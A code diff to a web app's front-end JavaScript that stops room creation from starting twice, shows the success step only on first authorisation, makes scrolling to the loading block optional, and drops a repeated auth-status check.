@@ -104,11 +104,14 @@ function initApp() {
     const roomProgressTime = document.getElementById("roomProgressTime");
     const roomLoadingStatus = document.getElementById("roomLoadingStatus");
 
+    let isCreatingRoom = false;
+
     function resetRoomCreation() {
         if (creationInterval) {
             clearInterval(creationInterval);
             creationInterval = null;
         }
+        isCreatingRoom = false;
         creationSeconds = 0;
         if (roomLoadingBlock) roomLoadingBlock.classList.add("hidden");
         if (roomInitialBlock) roomInitialBlock.classList.remove("hidden");
@@ -375,6 +378,7 @@ function initApp() {
             .then(data => {
                 if (data && data.ok) {
                     if (data.authorized) {
+                        const wasAuthorized = isAuthorized;
                         isAuthorized = true;
                         try {
                             localStorage.setItem("privateroom_authorized", "true");
@@ -386,8 +390,12 @@ function initApp() {
                         } catch (e) {}
                         if (googleAuthModal) googleAuthModal.classList.add("hidden");
                         updateAuthHeaderUI();
-                        showStep(stepSuccess);
-                        startRoomCreation();
+                        if (!wasAuthorized) {
+                            showStep(stepSuccess);
+                        }
+                        if (!creationInterval && !isCreatingRoom) {
+                            startRoomCreation(false);
+                        }
                     } else if (data.auth_step === "session_revoked" || data.auth_step === "logged_out" || data.auth_step === "banned") {
                         // User is unauthorized or session was revoked/logged out explicitly on server
                         const wasAuthorized = isAuthorized;
@@ -1688,7 +1696,11 @@ function initApp() {
     // Always reset on initial load
     resetRoomCreation();
 
-    function startRoomCreation() {
+    function startRoomCreation(scrollInto = false) {
+        if (creationInterval || isCreatingRoom) {
+            return;
+        }
+        isCreatingRoom = true;
         isAuthorized = true;
         try {
             localStorage.setItem("privateroom_authorized", "true");
@@ -1698,9 +1710,11 @@ function initApp() {
         if (roomInitialBlock) roomInitialBlock.classList.add("hidden");
         if (roomLoadingBlock) {
             roomLoadingBlock.classList.remove("hidden");
-            try {
-                roomLoadingBlock.scrollIntoView({ behavior: "smooth", block: "center" });
-            } catch (e) {}
+            if (scrollInto) {
+                try {
+                    roomLoadingBlock.scrollIntoView({ behavior: "smooth", block: "nearest" });
+                } catch (e) {}
+            }
         }
 
         creationSeconds = 0;
@@ -1715,8 +1729,6 @@ function initApp() {
             creationSeconds += 1;
             updateLoadingUI();
         }, 1000);
-
-        checkAuthStatus();
     }
 
     if (btnCreateRoom) {
@@ -1726,7 +1738,7 @@ function initApp() {
                 showStep(stepPhone);
                 return;
             }
-            startRoomCreation();
+            startRoomCreation(true);
         });
     }
 
